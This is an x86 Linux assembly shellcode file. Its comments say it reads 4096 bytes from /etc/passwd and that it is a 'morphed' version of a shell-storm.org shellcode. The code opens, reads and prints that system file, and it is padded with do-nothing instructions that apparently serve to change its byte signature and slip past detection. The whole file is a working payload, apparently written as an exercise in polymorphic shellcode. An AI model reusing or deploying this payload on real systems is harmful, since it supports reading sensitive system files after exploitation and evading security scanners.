; Shellcode purpose - Read 4096 bytes from /etc/passwd
; This shellcode is a morphed version of a shellcode taken from shell-storm.org
; OG Shellcode - http://shell-storm.org/shellcode/files/shellcode-842.php

global _start
_start:
    xor    ecx,ecx
    mul    ecx
    mov    al,0x5
    dec    al ;
    inc    al ;
    push   ecx
    push   0x64777373
    push   0x61702f63
    push   0x74652f2f
    mov    ebx,esp
    int    0x80
    xchg   ebx,eax
    xchg   ecx,eax
    xchg   eax,ecx ;
    xchg   ecx,eax ;
    mov    al,0x3
    xor    edx,edx
    mov    dx,0xfff
    inc    edx ;
    dec    edx ;
    inc    edx
    int    0x80
    xchg   edx,eax
    xor    eax,eax
    mov    al,0x5 ;
    dec    al     ;
    mov    al,0x4
    mov    bl,0x1
    int    0x80
    xchg   ebx,eax
    int    0x80
